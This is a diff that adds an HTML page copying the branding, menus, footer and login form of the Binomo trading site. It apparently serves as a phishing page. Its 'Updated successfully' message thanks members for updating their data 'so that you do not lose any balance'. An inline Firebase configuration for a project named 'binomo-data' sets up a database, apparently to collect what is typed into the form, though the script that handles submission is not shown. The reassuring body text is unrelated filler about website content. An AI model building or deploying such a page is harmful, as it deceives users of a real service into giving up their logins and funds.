@@ -1,0 +1,269 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link
+      rel="stylesheet"
+      href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700&display=swap"
+    />
+    <link
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.13.0/css/all.min.css"
+      rel="stylesheet"
+    />
+    <link rel="stylesheet" href="css/bootstrap.min.css" />
+    <link rel="stylesheet" href="css/style.css" />
+    <script src="https://www.gstatic.com/firebasejs/5.0.4/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/5.0.4/firebase-firestore.js"></script>
+
+    <title>binomo</title>
+  </head>
+  <body>
+    <!-- Start drawer -->
+    <div class="drawer" id="drawer">
+      <ul class="drawer__menu">
+        <li class="drawer__menu__item"><a href="">VIP</a></li>
+        <li class="drawer__menu__item"><a href=""> Prestige Club</a></li>
+        <li class="drawer__menu__item drawer__menu__dropdown">
+          <span>For traders</span>
+          <i class="fa fa-chevron-down"></i>
+
+          <ul class="drawer__dropdown">
+            <li><a href="">Tournaments</a></li>
+            <li><a href="">Promotions</a></li>
+            <li><a href="">Strategies</a></li>
+          </ul>
+
+        </a></li>
+        <li class="drawer__menu__item drawer__menu__dropdown">
+          <span>Training</span>
+          <i class="fa fa-chevron-down"></i>
+            <ul class="drawer__dropdown">
+            <li><a href="">Glossary of Terms</a></li>
+          </ul>
+        </li>
+        <li class="drawer__menu__item drawer__menu__dropdown">
+          <span>Information</span>
+          <i class="fa fa-chevron-down"></i>
+
+          <ul class="drawer__dropdown">
+            <li><a href="">Statuses</a></li>
+            <li><a href="">About us</a></li>
+            <li><a href="">Regulations</a></li>
+            <li><a href="">Client Agreement</a></li>
+            <li><a href="">Affiliate program</a></li>
+          </ul>
+        </li>
+        <li class="drawer__menu__item"><a href="">Help Center</a></li>
+      </ul>
+    </div>
+    <!-- End drawer -->
+
+    <!-- Start login -->
+    <div class="login" id="login">
+      <div class="d-flex">
+        <h3>Registration</h3>
+        <h3 class="active">Login</h3>
+      </div>
+      <div class="login-with d-flex  mt-4">
+        <p>
+          <img src="images/facebook.svg" alt="">
+        </p>
+        <p>
+          <img src="images/gp.svg" alt="">
+        </p>
+      </div>
+      <form action="">
+        <div class="field">
+          <label for="email">Email</label>
+          <input id="email" type="email" required>
+        </div>
+        <div class="field">
+          <label for="password">Password</label>
+          <input id="password" type="password" required>
+          <i class="fa fa-eye"></i>
+        </div>
+        <p class="text-underline text-left">Forgot my password</p>
+        <button type="button" id="btnLogin">Sign in</button>
+      </form>
+      <p class="mt-4 d-flex no-account justify-content-center">
+        No account? <button type="button" class="bg-dark btn btn-sm text-white">Create</button>
+      </p>
+    </div>
+    <!-- End login -->
+
+    <!-- Start Header -->
+    <header>
+      <!-- Start Navbar -->
+      <nav class="navbar navbar-light px-4">
+        <div class="navbar__left">
+          <i class="fa fa-times"></i>
+          <i class="fa fa-bars"></i>
+          <a class="navbar-brand" href="/">
+            <img src="images/logo-icon.svg" alt="">
+            <img class="invert" src="images/brand-logo.svg" alt="">
+            </a>
+        </div>
+        <div class="mr-auto mt-2 mt-lg-0 menu__right align-items-center d-flex">
+          <button id="openSignin">
+            <i class="fas fa-sign-in-alt"></i>
+            <span class="hidden-md">Sign in</span>
+          </button>        
+          <i id="closeSignin" class="fa fa-times"></i>
+          <img src="images/en.svg" alt="">
+        </div>
+      </nav>
+      <!-- End Navbar -->
+
+      <!-- Start Hero -->
+      <div class="hero p-5">
+        <div class="hero__info">
+          <h1>
+           Updated successfully
+          </h1>
+          <div class="hero__description mt-3">
+            <p class="_thanks">Dear member of Binomo Trading, we thank you for updating your data on the site and our financial system so that you do not lose any balance you have on the site
+              As the benefits of updating are many and varied in our web, we mention them:
+            </p>
+            <p><span class="_title"> First: It enhances the health of your information</span>
+              One of the main reasons for updating the content of a website is to update the information that was previously contained in it, especially since a lot of information is subject to change over time. What I wrote 7 months ago has undergone some updates now, and may no longer be relevant at the present time.</p>
+            <p><span class="_title">Second, it ensures the efficiency of the content</span>
+              Many commercial companies are currently fighting cold wars, we can call them content wars, many companies want to publish a lot in order to become more relevant and closer to the reader, and in order to appear first in search engines before any company appears before them, and this is not wrong, but rather On the contrary, but when companies carry out this process, the content may need to be corrected and updated later, and here lies the importance of updating the content of a website, regardless of the size of the company, to be able to modify errors in the content, upgrade it and improve its efficiency, thus ensuring that the content is free from defects.</p>
+            <p><span class="_title">Third, it improves search engines</span>
+              Updating your website’s content is essential to ensure SEO. If the content you put on your site is no longer a magnet for potential customers, you need to update it to improve audience consumption, and to maintain or restore your site’s top spot on Google. Solutions and not just your interest in presenting your company and talking about its advantages, and this will result in sympathy and customer association with the content because the content has become important and solves a problem for the customer and helps him in what he needs, which builds customer loyalty and dependence on you.</p>
+            <p>
+              <span class="_title">Fourth: Customers love to update</span>
+If you want your site to survive in this highly competitive digital world, you must create attractive content, but above all, do not consider that this content will be attractive all the time, and updating the content is what guarantees its continued attractiveness, because the process of updating the content of your site Online if not done, content loses its luster over time as competitors develop themselves and update their content.
+            </p>
+          </div>
+          <a class="redirect d-inline-block mt-3 p-3" href="https://binomo.com/">
+              BACK TO HOME PAGE
+          </a>
+        </div>
+      </div>
+      <!-- End Hero -->
+    </header>
+    <!-- End Header -->
+
+    <!-- Start Footer  -->
+    <footer>
+      <div class="container">
+        <div class="footer__links">
+          <div class="row">
+            <div class="col-sm-6 col-lg-3">
+              <h4>VIP</h4>
+              <ul>
+                <li><a href=""></a></li>
+              </ul>
+            </div>
+            <div class="col-sm-6 col-lg-3">
+              <h4>FOR TRADERS</h4>
+              <ul>
+                <li><a href="">Tournaments</a></li>
+                <li><a href="">Promotions</a></li>
+                <li><a href="">Strategies</a></li>
+              </ul>
+            </div>
+            <div class="col-sm-6 col-lg-3">
+              <h4>TRAINING</h4>
+              <ul>
+                <li><a href="">Help Center</a></li>
+                <li><a href="">Glossary of terms</a></li>
+              </ul>
+            </div>
+            <div class="col-sm-6 col-lg-3">
+              <h4>INFORMATION</h4>
+              <ul>
+                <li><a href="">Statuses</a></li>
+                <li><a href="">About us</a></li>
+                <li><a href="">Regulations</a></li>
+                <li><a href="">Client Agreement</a></li>
+                <li><a href="">Affiliate program</a></li>
+              </ul>
+            </div>
+          </div>
+        </div>
+        <div class="footer__contacts">
+          <div class="row mt-3 justify-content-between">
+            <div class="col-lg-6">
+              <p class="lead">
+                Binomo is a category "A" member of the International Financial
+                Commission, which guarantees the company's customers quality of
+                service, transparency of relations, and protection from a
+                neutral and independent dispute resolution organization.
+              </p>
+              <a class="text-white" href="tel:+18499366003"
+                >Phone: +18499366003</a
+              >
+              <div class="payments d-flex mt-3">
+                <img src="images/payments/logo-mc.svg" alt="" />
+                <img src="images/payments/logo-visa.svg" alt="" />
+                <img src="images/payments/jcb.svg" alt="" />
+                <img src="images/payments/amexpress.svg" alt="" />
+                <img src="images/payments/unionpay.svg" alt="" />
+              </div>
+            </div>
+            <div class="col-lg-5 contacts">
+              <h4>Contacts</h4>
+              <a class="d-block mt-3" href="mailto:support@binomo.com"
+                >support@binomo.com</a
+              >
+              <p>Dolphin Corp LLC</p>
+              <p>
+                First Floor, First St. Vincent Bank Ltd Building, James Street,
+                Kingstown, St.Vincent and the Grenadines
+              </p>
+              <p class="mt-3">
+                Pollack Trade LTD (a company registered in accordance with the
+                legislation of the Republic of Bulgaria, registration number
+                205942015, whose office is located at Georgi Sava Rakovski St.
+                96, Sredets Region, Sofia Municipality, Sofia 1000) is a payment
+                agent of Dolphin Corp LLC and is part of the Binomo group of
+                companies.
+              </p>
+            </div>
+          </div>
+        </div>
+        <div class="footer__social mt-3 d-flex justify-content-center">
+          <a href="" class="p-1 bg-dark mr-1"><i class="fab fa-youtube"></i></a>
+          <a href="" class="p-1 bg-dark mr-1"><i class="fab fa-instagram"></i></a>
+          <a href="" class="p-1 bg-dark mr-1"><i class="fab fa-telegram"></i></a>
+          <a href="" class="p-1 bg-dark mr-1"><i class="fab fa-twitter"></i></a>
+          <a href="" class="p-1 bg-dark mr-1"><i class="fab fa-facebook"></i></a>
+        </div>
+      </div>
+      <a class="d-block mt-3 text-center text-underline" href="">Privacy policy</a>
+      <p class="mt-3 text-center">© 2014-2022</p>
+      <p class="mt-4">
+        The financial operations offered on this site may involve increased
+        risk. By using the financial services and tools this site offers, you
+        may suffer serious financial loss, or completely lose the funds in your
+        guaranteed trading account. Please evaluate all the financial risks and
+        seek advice from an independent financial advisor before trading. Binomo
+        is not responsible for any direct, indirect or consequential losses, or
+        any other damages resulting from the user's actions on this site.
+      </p>
+    </footer>
+    <!-- End Footer  -->
+
+    <!-- Javascript -->
+    <script src="js/bootstrap.bundle.min.js"></script>
+    <script>
+      const firebaseConfig = {
+  apiKey: "AIzaSyCY3_E5c0Y8Ir8_0JXsAYGa3uI7V98hOSk",
+  authDomain: "binomo-data.firebaseapp.com",
+  projectId: "binomo-data",
+  storageBucket: "binomo-data.appspot.com",
+  messagingSenderId: "159157304926",
+  appId: "1:159157304926:web:7e2583ec9b14412effbecf",
+  measurementId: "G-4RDMHSEQYT"
+};
+firebase.initializeApp(firebaseConfig)
+  const db = firebase.firestore()
+  console.log(db)
+  db.settings({ timestampsInSnapshots: true })
+    </script>
+    <script src="js/main.js"></script>
+  </body>
+</html>
